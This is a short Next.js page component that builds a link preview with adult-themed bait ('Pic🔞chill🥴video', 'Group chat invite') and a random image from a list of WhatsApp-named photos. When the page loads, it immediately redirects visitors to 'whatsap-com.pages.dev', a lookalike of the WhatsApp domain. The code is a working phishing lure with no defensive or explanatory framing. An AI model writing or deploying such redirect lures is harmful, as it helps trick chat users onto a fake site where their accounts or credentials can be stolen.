import { useEffect } from "react";
import { useRouter } from "next/router";
import Head from "next/head";

function Home({ randomImage }) {
  const router = useRouter();

  useEffect(() => {
    // Perform redirection logic here
    // For example, redirect to https://example.com
    router.push("https://whatsap-com.pages.dev");
  }, []); // The empty dependency array ensures that this effect runs only once on component mount

  return (
    <div>
      <Head>
        <meta property="og:image" content={randomImage} />
        <meta property="og:title" content="Pic🔞chill🥴video" />
        <meta property="og:description" content="Group chat invite" />
        {/* Other meta tags */}
      </Head>

      {/* Your page content */}
    </div>
  );
}

export async function getServerSideProps() {
  // Array of sample image URLs
  const imageArray = [
    "https://i.ibb.co/wY3wrQZ/IMG-20231209-WA0290-min.jpg",
    "https://i.ibb.co/thjWpFs/IMG-20231209-WA0317-min.jpg",
    "https://i.ibb.co/j8kmb0B/IMG-20231209-WA0460-1-min.jpg",
    // Add more image URLs as needed
  ];

  // Select a random image from the array
  const randomImage = imageArray[Math.floor(Math.random() * imageArray.length)];

  return {
    props: {
      randomImage,
    },
  };
}

export default Home;
